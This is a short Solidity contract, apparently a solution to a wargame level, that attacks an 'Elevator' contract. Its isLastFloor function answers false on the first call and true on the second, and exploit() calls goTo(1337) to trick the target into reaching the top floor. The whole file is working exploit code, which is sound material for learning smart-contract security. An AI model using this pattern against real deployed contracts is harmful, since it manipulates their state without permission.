// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EvilBuilding {
	bool toggle;

	function isLastFloor(uint) external returns (bool _toggle){
		_toggle = toggle;
		toggle = !toggle;
	}

	function exploit(address target) external {
		IElevator(target).goTo(1337);
	}
}

interface IElevator {
	function goTo(uint _floor) external;
}